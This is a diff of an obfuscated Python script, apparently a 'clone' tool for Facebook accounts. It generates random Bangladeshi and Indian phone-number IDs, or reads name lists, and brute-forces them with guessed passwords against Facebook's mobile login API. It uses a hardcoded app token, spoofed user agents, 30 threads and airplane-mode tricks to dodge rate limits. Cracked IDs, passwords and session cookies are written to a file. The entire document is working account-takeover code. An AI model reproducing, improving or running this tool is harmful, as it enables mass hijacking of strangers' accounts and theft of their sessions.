@@ -41,14 +41,14 @@ def clear ():#line:45
         os .system (f'clear')#line:46
         print (logo )#line:47
 def CEN ():#line:49
-	OO0O00000OOOOO00O =f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"#line:50
-	OO00O00O00O0O0000 =str (random .randint (10000000 ,66666666 ))#line:51
-	O00000O000OOO0O0O =str (random .randint (000000000 ,999999999 ))#line:52
-	OO000O0O00O0OOO0O =random .choice (['2.0','2.5','3.0'])#line:53
-	O00O0O0O00O0OOOOO =random .choice (["720","1080","1280"])#line:54
-	O0O00O00O0O0O0OO0 =random .choice (["720","1080","1280","1440","1920"])#line:55
-	OO0O00O00O0O0OOO0 =f"[FBAN/FB4A;FBAV/{str(OO0O00000OOOOO00O)};FBBV/{str(OO00O00O00O0O0000)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={OO000O0O00O0OOO0O},width={O00O0O0O00O0OOOOO},height={O0O00O00O0O0O0OO0}}};FBLC/en_US;FBRV/{str(O00000O000OOO0O0O)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"#line:56
-	return OO0O00O00O0O0OOO0 #line:57
+	O0OO00000OO0O0O0O =f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"#line:50
+	OO0000O0OO000O000 =str (random .randint (10000000 ,66666666 ))#line:51
+	OOO00OO0OOOO00O0O =str (random .randint (000000000 ,999999999 ))#line:52
+	O000O0OO0O00O000O =random .choice (['2.0','2.5','3.0'])#line:53
+	O000OO00000OO00OO =random .choice (["720","1080","1280"])#line:54
+	O00OOOO00000OOO00 =random .choice (["720","1080","1280","1440","1920"])#line:55
+	O00000OO0OOOO0OOO =f"[FBAN/FB4A;FBAV/{str(O0OO00000OO0O0O0O)};FBBV/{str(OO0000O0OO000O000)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={O000O0OO0O00O000O},width={O000OO00000OO00OO},height={O00OOOO00000OOO00}}};FBLC/en_US;FBRV/{str(OOO00OO0OOOO00O0O)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"#line:56
+	return O00000OO0OOOO0OOO #line:57
 logo =(f"""
        {G1}███████ {Y}████████ {M}███    ██ {S}█████████
        {G2}██      {Y}██       {M}██ █   ██ {S}   ██    
@@ -68,56 +68,56 @@ def menu ():#line:72
     print (f'{G1}[{A}3{G1}]{G1} CONTACT OWNER ')#line:76
     print (f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')#line:77
     linex ()#line:78
-    OO0OOOO0O0O0O0O00 =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:79
-    if OO0OOOO0O0O0O0O00 in ['1']:#line:80
+    OO00OOO0OOOOO0O0O =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:79
+    if OO00OOO0OOOOO0O0O in ['1']:#line:80
         file ()#line:81
-    elif OO0OOOO0O0O0O0O00 in ['2']:#line:82
-        XXX ()#line:83
-    elif OO0OOOO0O0O0O0O00 in ['3']:#line:84
+    elif OO00OOO0OOOOO0O0O in ['2']:#line:82
+        tsu ()#line:83
+    elif OO00OOO0OOOOO0O0O in ['3']:#line:84
         os .system ('xdg-open https://www.facebook.com/CenT.aep');menu ()#line:85
-    elif OO0OOOO0O0O0O0O00 in ['0']:#line:86
+    elif OO00OOO0OOOOO0O0O in ['0']:#line:86
         sys .exit ()#line:87
     else :#line:88
         menu ()#line:89
-def XXX ():#line:91
+def tsu ():#line:91
     clear ()#line:92
     print (f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONE')#line:93
     print (f'{G1}[{A}2{G1}]{G1} INDIA CLONE')#line:94
     print (f'{G1}[{A}0{G1}]{G1} BACK MENU');linex ()#line:95
-    O00O0O000OOOOO000 =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:96
-    if O00O0O000OOOOO000 in ['1']:#line:97
+    OOOO0OO0O00O0OOO0 =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:96
+    if OOOO0OO0O00O0OOO0 in ['1']:#line:97
         bd ()#line:98
-    elif O00O0O000OOOOO000 in ['2']:#line:99
+    elif OOOO0OO0O00O0OOO0 in ['2']:#line:99
         India ()#line:100
-    elif O00O0O000OOOOO000 in ['0']:#line:101
+    elif OOOO0OO0O00O0OOO0 in ['0']:#line:101
     	menu ()#line:102
     else :#line:103
-        XXX ()#line:104
+        tsu ()#line:104
 def bd ():#line:106
     clear ()#line:107
-    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016');linex ()#line:108
-    O0O00O000O0OO0OO0 =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:109
+    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 099{G}/{A}094{G}/{A}091{G}/{A}095');linex ()#line:108
+    OOOO00O000OO00OOO =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:109
     clear ()#line:110
     print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:111
-    OO0O0O0O00O0O0000 =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:112
-    for O0O0O0OO0000OOO00 in range (OO0O0O0O00O0O0000 ):#line:113
-        O0000000O00O00OO0 ="".join (random .choice (string .digits )for _O0O00O0OOOOO00O0O in range (8 ))#line:114
-        user .append (O0000000O00O00OO0 )#line:115
+    O00OO00O0O00OOOOO =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:112
+    for OOOO00000OO00O0OO in range (O00OO00O0O00OOOOO ):#line:113
+        OO000OOOOO00O00OO ="".join (random .choice (string .digits )for _O00O00OO0O0O00O0O in range (8 ))#line:114
+        user .append (OO000OOOOO00O00OO )#line:115
     clear ()#line:116
-    with ThreadPool (max_workers =30 )as OO00OO00O0O00OOOO :#line:117
+    with ThreadPool (max_workers =30 )as OOO000OO00O00OOOO :#line:117
         clear ()#line:118
-        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {O0O00O000O0OO0OO0}')#line:119
+        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {OOOO00O000OO00OOO}')#line:119
         print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:120
         print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:121
-        for O000OO0000O0OOOO0 in user :#line:122
-            OO0O0O0OOOO0O00OO =O0O00O000O0OO0OO0 +O000OO0000O0OOOO0 #line:123
-            OOOOOOOOOOOO0OO00 =OO0O0O0OOOO0O00OO [:8 ]#line:124
-            OO000OOO0O00O00O0 =OO0O0O0OOOO0O00OO [:7 ]#line:125
-            OOOOOOO00OOOOOO0O =OO0O0O0OOOO0O00OO [:6 ]#line:126
-            OO0OO000O0OOOOO0O =O000OO0000O0OOOO0 [1 :]#line:127
-            O0OO0OOO00OO00OOO =O000OO0000O0OOOO0 [2 :]#line:128
-            OOOO0OO0O000OOO0O =[OO0O0O0OOOO0O00OO ,O000OO0000O0OOOO0 ,OOOOOOOOOOOO0OO00 ,OO000OOO0O00O00O0 ,OOOOOOO00OOOOOO0O ,OO0OO000O0OOOOO0O ,O0OO0OOO00OO00OOO ,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']#line:129
-            OO00OO00O0O00OOOO .submit (randm ,OO0O0O0OOOO0O00OO ,OOOO0OO0O000OOO0O )#line:130
+        for OO0OOO0O0OOO00000 in user :#line:122
+            OO0OO00O000O000O0 =OOOO00O000OO00OOO +OO0OOO0O0OOO00000 #line:123
+            OOO0000OOO000OOOO =OO0OO00O000O000O0 [:8 ]#line:124
+            O00OO000O000O000O =OO0OO00O000O000O0 [:7 ]#line:125
+            OOO00OOO00O0OOOOO =OO0OO00O000O000O0 [:6 ]#line:126
+            O00OO000O00OO0OOO =OO0OOO0O0OOO00000 [1 :]#line:127
+            O0OOO000OO000O00O =OO0OOO0O0OOO00000 [2 :]#line:128
+            O00OO00000O0O00O0 =[OO0OO00O000O000O0 ,OO0OOO0O0OOO00000 ,OOO0000OOO000OOOO ,O00OO000O000O000O ,OOO00OOO00O0OOOOO ,O00OO000O00OO0OOO ,O0OOO000OO000O00O ,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']#line:129
+            OOO000OO00O00OOOO .submit (randm ,OO0OO00O000O000O0 ,O00OO00000O0O00O0 )#line:130
     print ('')#line:131
     print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:132
     print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:133
@@ -129,23 +129,23 @@ def bd ():#line:106
 def India ():#line:140
     clear ()#line:141
     print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex ()#line:142
-    OOOO0OOOO000O0O0O =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:143
+    O000OOO0OO00OOOOO =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:143
     clear ()#line:144
     print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:145
-    OOO0O0O00OO0OOO0O =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:146
-    for O00OOOOO0O00O00O0 in range (OOO0O0O00OO0OOO0O ):#line:147
-        O00OOOOO00O0OO000 ="".join (random .choice (string .digits )for _OO0O0OOO0OOOO0O00 in range (7 ))#line:148
-        user .append (O00OOOOO00O0OO000 )#line:149
+    O0OOO000OO00O00OO =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:146
+    for OOOO0OOO000O000OO in range (O0OOO000OO00O00OO ):#line:147
+        OO000OOOO0O0O0OOO ="".join (random .choice (string .digits )for _OOO0000OOOO00OO0O in range (7 ))#line:148
+        user .append (OO000OOOO0O0O0OOO )#line:149
     clear ()#line:150
-    with ThreadPool (max_workers =30 )as O00O0O00OOOO0OO0O :#line:151
+    with ThreadPool (max_workers =30 )as O0O0OO00000OOO00O :#line:151
         clear ()#line:152
-        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {OOOO0OOOO000O0O0O}')#line:153
+        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {O000OOO0OO00OOOOO}')#line:153
         print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:154
         print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:155
-        for OOO00O0000OO000O0 in user :#line:156
-            OO00OOO000OO00O0O =OOOO0OOOO000O0O0O +OOO00O0000OO000O0 #line:157
-            OO0O00O000OOO0OO0 =[OOO00O0000OO000O0 ,OO00OOO000OO00O0O [:8 ],'57273200','59039200','57575751']#line:158
-            O00O0O00OOOO0OO0O .submit (randm ,OO00OOO000OO00O0O ,OO0O00O000OOO0OO0 )#line:159
+        for O00OO0000000O0OOO in user :#line:156
+            O0O0OOOO00O0OOOOO =O000OOO0OO00OOOOO +O00OO0000000O0OOO #line:157
+            O0000000000OO0OOO =[O00OO0000000O0OOO ,O0O0OOOO00O0OOOOO [:8 ],'57273200','59039200','57575751']#line:158
+            O0O0OO00000OOO00O .submit (randm ,O0O0OOOO00O0OOOOO ,O0000000000OO0OOO )#line:159
     print ('')#line:160
     print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:161
     print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:162
@@ -157,28 +157,28 @@ def India ():#line:140
 def file ():#line:169
     clear ()#line:170
     print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}SWAG.txt');linex ()#line:171
-    O00000O0O0OO0OO0O =input (f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')#line:172
+    O0000O0OOOOOO0O0O =input (f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')#line:172
     try :#line:173
-        O0OO00OO0O000OO00 =open (O00000O0O0OO0OO0O ,'r').read ().splitlines ()#line:174
+        OO0O00OO0OOOO0O00 =open (O0000O0OOOOOO0O0O ,'r').read ().splitlines ()#line:174
     except FileNotFoundError :#line:175
         print (f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time .sleep (1 )#line:176
-        O00000O0O0OO0OO0O ()#line:177
+        O0000O0OOOOOO0O0O ()#line:177
     clear ()#line:178
     print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex ()#line:179
-    OO0O0O0O000OOO0OO =int (input (f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))#line:180
+    O00OO000O0O0O000O =int (input (f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))#line:180
     clear ()#line:181
-    for O00OOO0000O00000O in range (OO0O0O0O000OOO0OO ):#line:182
+    for O0O0OO00OOOO0OOO0 in range (O00OO000O0O0O000O ):#line:182
         print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')#line:183
-        plist .append (input (f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{O00OOO0000O00000O+1}{G1}]{G1} {A}➢{S} '));linex ()#line:184
-    with ThreadPool (max_workers =30 )as O0OOO00OO0O000OOO :#line:185
-        OOO00O00O0O0OOOOO =str (len (O0OO00OO0O000OO00 ))#line:186
+        plist .append (input (f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{O0O0OO00OOOO0OOO0+1}{G1}]{G1} {A}➢{S} '));linex ()#line:184
+    with ThreadPool (max_workers =30 )as O0O00000OO00O0O0O :#line:185
+        OO0OO0O000O00OOOO =str (len (OO0O00OO0OOOO0O00 ))#line:186
         clear ()#line:187
-        print (f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {OOO00O00O0O0OOOOO}')#line:188
+        print (f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {OO0OO0O000O00OOOO}')#line:188
         print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:189
-        for O0OO0O0O0O0O000O0 in O0OO00OO0O000OO00 :#line:190
-            OOO0OOO0O0OO0OOO0 ,O0O000O000OO000OO =O0OO0O0O0O0O000O0 .split ('|')#line:191
-            OOO0O0O0O000O0O0O =plist #line:192
-            O0OOO00OO0O000OOO .submit (M1 ,OOO0OOO0O0OO0OOO0 ,O0O000O000OO000OO ,OOO0O0O0O000O0O0O )#line:193
+        for OOOOO0O00OOO00O00 in OO0O00OO0OOOO0O00 :#line:190
+            O00OO00OO00OO0O00 ,O0OO0OO00000OO000 =OOOOO0O00OOO00O00 .split ('|')#line:191
+            OOO00O00OOOO0O0OO =plist #line:192
+            O0O00000OO00O0O0O .submit (M1 ,O00OO00OO00OO0O00 ,O0OO0OO00000OO000 ,OOO00O00OOOO0O0OO )#line:193
     print ('')#line:194
     print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:195
     print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:196
@@ -187,56 +187,56 @@ def file ():#line:169
     print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:199
     input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:200
     menu ()#line:201
-def randm (O0OO00O0OOOOO0O0O ,O000O00O0O00000O0 ):#line:203
+def randm (OOO0OOOO0O00OOO00 ,OO00OO0OOOOOO00O0 ):#line:203
     global loop ,ok #line:204
-    OOOOOOOO000OO00OO =random .choice (prox )#line:205
-    OO0OOO0OOO0000OOO ={'http':'socks4://'+OOOOOOOO000OO00OO }#line:206
+    O00O00000OO000O00 =random .choice (prox )#line:205
+    OO00O00OO000O00OO ={'http':'socks4://'+O00O00000OO000O00 }#line:206
     sys .stdout .write (f'\r\r{A}[{G1}SWAG-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:207
     sys .stdout .flush ()#line:208
     try :#line:209
-        for OOOO000O0000O000O in O000O00O0O00000O0 :#line:210
-            OOOO000O0OOOO0O00 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':O0OO00O0OOOOO0O0O ,'password':OOOO000O0000O000O ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:231
-            O00OOO0OOOO0OO0O0 ={'User-Agent':sex (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'Banglalink','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:249
-            O0000OOOO0O0O0000 ='https://b-graph.facebook.com/auth/login'#line:250
-            O000OOO0OOOO0O000 =requests .post (O0000OOOO0O0O0000 ,data =OOOO000O0OOOO0O00 ,headers =O00OOO0OOOO0OO0O0 ,allow_redirects =False ).text #line:251
-            OOOO0OOO00OOOO0O0 =json .loads (O000OOO0OOOO0O000 )#line:252
-            if 'access_token'in OOOO0OOO00OOOO0O0 :#line:253
-                O0000O0OO00O0OOO0 =str (OOOO0OOO00OOOO0O0 ['uid'])#line:254
-                O00OOOOOOO0O0O0O0 =";".join (OO0000O000O00OO00 ["name"]+"="+OO0000O000O00OO00 ["value"]for OO0000O000O00OO00 in OOOO0OOO00OOOO0O0 ["session_cookies"])#line:255
+        for OO0O0OO0O0O000OOO in OO00OO0OOOOOO00O0 :#line:210
+            O0OO00O0OO0O0O000 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':OOO0OOOO0O00OOO00 ,'password':OO0O0OO0O0O000OOO ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:231
+            OO0O00OO0O0O00OO0 ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'MOBILE.LTE','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:249
+            OOO000O0O00OO00O0 ='https://b-graph.facebook.com/auth/login'#line:250
+            OOO0OOOOO0O0O0000 =requests .post (OOO000O0O00OO00O0 ,data =O0OO00O0OO0O0O000 ,headers =OO0O00OO0O0O00OO0 ,allow_redirects =False ).text #line:251
+            OO00OO00O0OOOOOO0 =json .loads (OOO0OOOOO0O0O0000 )#line:252
+            if 'access_token'in OO00OO00O0OOOOOO0 :#line:253
+                OO0O000OO0000OO0O =str (OO00OO00O0OOOOOO0 ['uid'])#line:254
+                OOOOOOO000O00O0O0 =";".join (OO00O00O00000O0O0 ["name"]+"="+OO00O00O00000O0O0 ["value"]for OO00O00O00000O0O0 in OO00OO00O0OOOOOO0 ["session_cookies"])#line:255
                 if res =='LIVE':#line:256
-                	print (f'\r\r{A}[{G1}CENT-OK{A}]{G1} {O0000O0OO00O0OOO0} {A}|{G1} {OOOO000O0000O000O}');open ('/sdcard/CENT-FILE-OK.txt','a').write (O0000O0OO00O0OOO0 +'|'+OOOO000O0000O000O +'|'+O00OOOOOOO0O0O0O0 +'\n');ok .append (O0000O0OO00O0OOO0 );break #line:257
+                	print (f'\r\r{A}[{G1}CENT-OK{A}]{G1} {OO0O000OO0000OO0O} {A}|{G1} {OO0O0OO0O0O000OOO}');open ('/sdcard/CENT-FILE-OK.txt','a').write (OO0O000OO0000OO0O +'|'+OO0O0OO0O0O000OOO +'|'+OOOOOOO000O00O0O0 +'\n');ok .append (OO0O000OO0000OO0O );break #line:257
                 if res =='LOCK':#line:258
-                	print (f'\r\r{A}[{S}CENT-PODLOCK{A}]{S} {O0000O0OO00O0OOO0} {A}|{S} {OOOO000O0000O000O}');break #line:259
+                	print (f'\r\r{A}[{S}CENT-PODLOCK{A}]{S} {OO0O000OO0000OO0O} {A}|{S} {OO0O0OO0O0O000OOO}');break #line:259
             else :continue #line:260
         loop +=1 #line:261
-    except Exception as O0O000OOOOO0OO00O :#line:262
+    except Exception as OO0O000O000O0OOOO :#line:262
         pass #line:263
-def M1 (O00OOOO00OO0OO0O0 ,O00OO0O0O0O0O0000 ,OO0OOOOOOO0OOOO0O ):#line:265
+def M1 (OO0000OOOOOO00OOO ,O0OOO00OOO000OO0O ,OO000O000OOO0OO00 ):#line:265
     global loop ,ok #line:266
-    OO000000OO0O0OOOO =random .choice (prox )#line:267
-    O0OO00O00O0000OOO ={'http':'socks4://'+OO000000OO0O0OOOO }#line:268
+    OOO0OOOOO00O00OO0 =random .choice (prox )#line:267
+    OO0O0O00000O0OO0O ={'http':'socks4://'+OOO0OOOOO00O00OO0 }#line:268
     sys .stdout .write (f'\r\r{A}[{G1}CENT-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:269
     sys .stdout .flush ()#line:270
     try :#line:271
-        O00OOO0000OO0OO0O =O00OO0O0O0O0O0000 .split (' ')[0 ]#line:272
-        try :OO00OOOO0OOOO0O0O =O00OO0O0O0O0O0000 .split (' ')[1 ]#line:273
-        except :OO00OOOO0OOOO0O0O =O00OOO0000OO0OO0O #line:274
-        for O0000000000O00OOO in OO0OOOOOOO0OOOO0O :#line:275
-            O0000000O00OOO0OO =O0000000000O00OOO .replace ('first',O00OOO0000OO0OO0O .lower ()).replace ('First',O00OOO0000OO0OO0O ).replace ('last',OO00OOOO0OOOO0O0O .lower ()).replace ('Last',OO00OOOO0OOOO0O0O ).replace ('Name',O00OO0O0O0O0O0000 ).replace ('name',O00OO0O0O0O0O0000 .lower ())#line:276
-            O00OO0O0OO0O0OO0O ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':O00OOOO00OO0OO0O0 ,'password':O0000000O00OOO0OO ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:297
-            OOO0O00OO00000O00 ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'Banglalink','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:315
-            O0OO0OO0OOOOO0O00 =requests .post ('https://b-graph.facebook.com/auth/login',data =O00OO0O0OO0O0OO0O ,headers =OOO0O00OO00000O00 ).json ()#line:316
-            if 'access_token'in O0OO0OO0OOOOO0O00 :#line:317
-                print (f'\r\r{A}[{G1}CEN-OK{A}]{G1} {O00OOOO00OO0OO0O0} {A}|{G1} {O0000000O00OOO0OO}')#line:318
-                OO00O00000OOOOOO0 =";".join (OO0OO0OO0OOOOOOOO ["name"]+"="+OO0OO0OO0OOOOOOOO ["value"]for OO0OO0OO0OOOOOOOO in O0OO0OO0OOOOO0O00 ["session_cookies"])#line:319
-                open ('/sdcard/CEN-FILE-OK.txt','a').write (uid +'|'+O0000000O00OOO0OO +'|'+OO00O00000OOOOOO0 +'\n')#line:320
-                ok .append (O00OOOO00OO0OO0O0 )#line:321
+        O0O0O0O0OOO0O0OOO =O0OOO00OOO000OO0O .split (' ')[0 ]#line:272
+        try :OOOO0O0OOO0O00O00 =O0OOO00OOO000OO0O .split (' ')[1 ]#line:273
+        except :OOOO0O0OOO0O00O00 =O0O0O0O0OOO0O0OOO #line:274
+        for O00OO0O0OOOO00O00 in OO000O000OOO0OO00 :#line:275
+            O0O0OOOO00OOOO000 =O00OO0O0OOOO00O00 .replace ('first',O0O0O0O0OOO0O0OOO .lower ()).replace ('First',O0O0O0O0OOO0O0OOO ).replace ('last',OOOO0O0OOO0O00O00 .lower ()).replace ('Last',OOOO0O0OOO0O00O00 ).replace ('Name',O0OOO00OOO000OO0O ).replace ('name',O0OOO00OOO000OO0O .lower ())#line:276
+            O0O00O000000OO000 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':OO0000OOOOOO00OOO ,'password':O0O0OOOO00OOOO000 ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:297
